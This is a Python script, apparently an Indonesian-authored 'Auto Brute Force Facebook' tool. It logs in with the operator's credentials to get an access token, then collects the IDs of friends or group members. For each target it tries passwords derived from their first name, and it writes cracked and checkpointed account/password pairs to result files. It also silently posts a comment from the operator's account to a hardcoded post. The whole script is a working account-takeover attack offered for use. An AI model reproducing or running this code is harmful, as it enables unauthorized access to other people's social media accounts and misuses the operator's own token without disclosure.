#!/usr/bin/python3.7
# -*- Coding: utf-8 -*-
# Piton gede panjang
# Copyright: DulLah

## USE PYTHON VERSI 3 ##

import os, sys, requests, hashlib
from time import sleep
from getpass import getpass
from multiprocessing.pool import ThreadPool

s = requests.Session()
url = "https://graph.facebook.com/{}"
api="https://api.facebook.com/{}"

target = []
found = []
checkpoint = []

W = "\033[1;97m"
G = "\033[1;92m"
R = "\033[1;91m"
P = "\033[1;95m"
Y = "\033[1;93m"
C = "\033[1;96m"
GB = "\033[1;42m"
PM = "\033[3;95m"
CM = "\033[3;96m"
RM = "\033[3;91m"
RE = "\033[0m"

def get(email,pasw):
	print("%s[*]%s generate access token ..."%(P,W))
	b = open("cookie/token.log","w")
	try:
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pasw,"return_ssl_resources":"0","v":"1.0"}
		x = hashlib.new('md5')
		x.update(sig.encode("utf-8"))
		data.update({'sig':x.hexdigest()})
		ok=s.get(api.format("restserver.php"),params=data).json()
		if "access_token" in ok:
			b.write(ok["access_token"])
			b.close()
			print("%s[*]%s successfully generate access token"%(G,W))
			exit("%s[*]%s access token saved: cookie/token.log"%(G,W))
		elif "www.facebook.com" in ok["error_msg"]:
			os.system("rm -rf cookie")
			print("%s[×]%s failed to generate access token !!"%(R,W))
			exit("%s[!] %syour account checkpoint !!"%(R,W))
		else:
			os.system("rm -rf cookie")
			print("%s[×]%s failed to generate access token !!"%(R,W))
			exit("%s[!] %swrong email or password !!"%(R,W))		
	except requests.exceptions.ConnectionError:
		print("%s[×] %sfailed to generate access token"%(R,W))
		exit("%s[!] %scheck your connection !!"%(R,W))
	
def menu(n,toket):
	global loop
	loop=0
	banner()
	print("%s(●) %sWellcome %s%s"%(G,W,Y,n))
	print("""
%s## %s1 ID FROM YOUR LIST FRIEND
%s## %s2 ID FROM FRIEND
%s## %s3 ID FROM MEMBER GROUP

%s## %s0 Exit the program
"""%(G,W,G,W,G,W,G,R))
	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
	if unikers in [""]:
		exit("%s[!]%s wrong input !!"%(R,W))
	elif unikers in ["1"]:
		print("\n%s[*]%s from : %s"%(P,W,n))
		for z in s.get(url.format("me/friends?access_token=%s"%(toket))).json()["data"]:
			target.append(z["id"])
	elif unikers in ["2"]:
		try:
			idf = input("\n%s[*] %sID friend : "%(P,W))
			k = s.get(url.format(idf+"?access_token=%s"%(toket))).json()["name"]
		except KeyError:
			exit("%s[!]%s ups sorry friend not found !!"%(R,W))
		print("%s[*]%s from : %s"%(P,W,k))
		for f in s.get(url.format(idf+"/friends?access_token=%s"%(toket))).json()["data"]:
			target.append(f["id"])
	elif unikers in ["3"]:
		try:	
			idg = input("\n%s[*]%s ID group : "%(P,W))
			e = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket))).json()["name"]
		except KeyError:
			exit("%s[!]%s ups sorry group not found !!"%(R,W))
		print("%s[*]%s from : %s"%(P,W,e))
		for y in s.get(url.format(idg+"/members?fields=name,id&limit=999999&access_token=%s"%(toket))).json()["data"]:
			target.append(y["id"])
	elif unikers in ["0"]:
		os.system("rm -rf cookie")
		exit()
	else:
		exit("%s[!]%s wrong input !!"%(R,W))
		
	print("%s[*]%s please wait"%(P,W))
	
	m = ThreadPool(30)
	m.map(x,target)
	result(found,checkpoint)
	exit("%s\n[+] %sDone ... "%(R,W))

def x(user):
	global loop
	try:
		os.mkdir("result")
	except:
		pass
	try:
		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
		for pas in [nama+"123",nama+"12345","sayang"]:
			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
				found.append("%s | %s"%(user,pas))
			elif "www.facebook.com" in p["error_msg"]:
				open("result/checkpoint.txt","a").write("%s | %s\n"%(user,pas))
				checkpoint.append("%s | %s"%(user,pas))
		loop+=1
		print("\r%s[%s%s%s]%s cracking %s/%s found:%s%s   "%(P,Y,len(checkpoint),P,W,loop,len(target),G,len(found)),end=""),;sys.stdout.flush()
	except:pass
		
def result(found,checkpoint):
	if len(found) !=0:
		print("\n\n%s[%s] %sfound%s >"%(G,len(found),W,R))
		for i in found:
			print("%s###%s %s"%(G,W,i))
		print("\n%s[+]%s file saved: result/found.txt"%(P,W))
	if len(checkpoint) !=0:
		print("\n\n%s[%s] %scheckpoint%s >"%(Y,len(checkpoint),W,R))
		for i in checkpoint:
			print("%s###%s %s"%(Y,W,i))
		print("\n%s[+]%s file saved: result/checkpoint.txt"%(P,W))
	if len(found)==0 and len(checkpoint)==0:
		print("\n\n%s[!]%s no result found:)"%(R,W))
		
def cek():
	global toket
	banner()
	print("%s[*]%s load access token"%(P,W))
	sleep(1)
	try:
		os.mkdir("cookie")
	except:
		pass
	try:
		toket = open("cookie/token.log","r").read()
	except OSError:
		print("%s[×] %sups sorry token not found !!"%(R,W))
		sleep(2)
		login()
	try:
		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
		s.post(url.format("100005584243934_1145924785603652/comments?message=Mantap&access_token=%s"%(toket)))
		print("%s[*] %ssuccess load access token"%(G,W))
		sleep(2)
		menu(n,toket)
	except KeyError:
		os.system("rm -rf cookie/token.log")
		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
		sleep(2)
		login()
	except requests.exceptions.ConnectionError:
		exit("%s[!] %sups no connection !!"%(R,W))
		
def login():
	print("%s\n\n* login your account facebook first *\n"%(W))
	email = input("%s[~] %sEmail : "%(P,W))
	pasw = getpass("%s[~] %sPasss : "%(P,W))
	get(email,pasw)
	
def banner():
	os.system("clear")
	print("""
%s[+]%s====== %sAuto Brute Force Facebook%s ======%s[+]%s

╭══════════════════════════════════════════╮
║%s# %sAuthor : %sDulLah%s %s                        ║
║%s# %sFB     : %sHttps://fb.me/DulahZ%s  %s         ║
║%s# %sGithub : %sHttps://github.com/unikers71%s%s   ║
╰══════════════════════════════════════════╯
 """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
cek()
